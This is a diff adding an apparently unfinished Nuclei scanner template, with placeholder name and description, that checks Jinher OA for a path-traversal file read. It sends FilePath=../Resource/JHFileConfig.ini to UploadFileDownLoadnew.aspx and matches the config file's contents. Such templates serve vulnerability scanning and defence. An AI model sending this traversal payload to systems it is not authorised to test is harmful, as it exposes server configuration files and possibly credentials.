@@ -1,0 +1,20 @@
+id: jinher-UploadFileDownLoadnew-fileread
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=../Resource/JHFileConfig.ini"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[JHFile]'
